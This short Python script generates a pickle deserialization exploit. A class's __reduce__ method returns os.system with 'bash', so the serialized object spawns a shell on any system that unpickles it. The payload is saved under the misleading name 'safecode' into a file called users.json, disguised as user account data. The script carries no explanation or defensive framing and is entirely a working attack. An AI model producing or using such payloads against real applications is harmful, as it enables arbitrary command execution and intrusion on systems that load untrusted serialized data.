import os
import pickle

class abc(object):
    def __reduce__(self):
        return (os.system, ('bash',))

#s = {"username":name,"password":password}
safecode = pickle.dumps(abc())
with open("users.json","wb") as f:
    f.write(safecode)

